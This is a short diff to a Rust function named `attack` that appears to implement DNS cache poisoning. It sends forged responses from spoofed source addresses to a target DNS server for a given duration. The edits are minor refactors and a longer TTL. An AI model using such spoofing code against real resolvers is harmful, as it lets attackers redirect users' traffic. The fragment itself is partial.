@@ -19,13 +19,13 @@ fn rand_alphanum_string(length: usize) -> String {
 pub fn attack(
     attacker_ns: &str,
     target_domain: &str,
-    target_server_addr: Ipv4Addr,
+    target_server_addr: &Ipv4Addr,
     spoofed_addrs: &[Ipv4Addr],
     duration: Duration,
     delay: Duration,
 ) -> Result<(), String> {
     const RAND_RESOURCE_LEN: usize = 7;
-    const TTL: u32 = 120;
+    const TTL: u32 = 240;
 
     let client = dns::Client::new(target_server_addr.to_string());
 
@@ -69,7 +69,7 @@ pub fn attack(
     while start.elapsed() < duration {
         for addr in spoofed_addrs {
             let mut spoofer =
-                match Spoofer::new(*addr, target_server_addr, response_message.to_bytes().len()) {
+                match Spoofer::new(addr, target_server_addr, response_message.to_bytes().len()) {
                     Err(e) => return Err(e.to_string()),
                     Ok(s) => s,
                 };
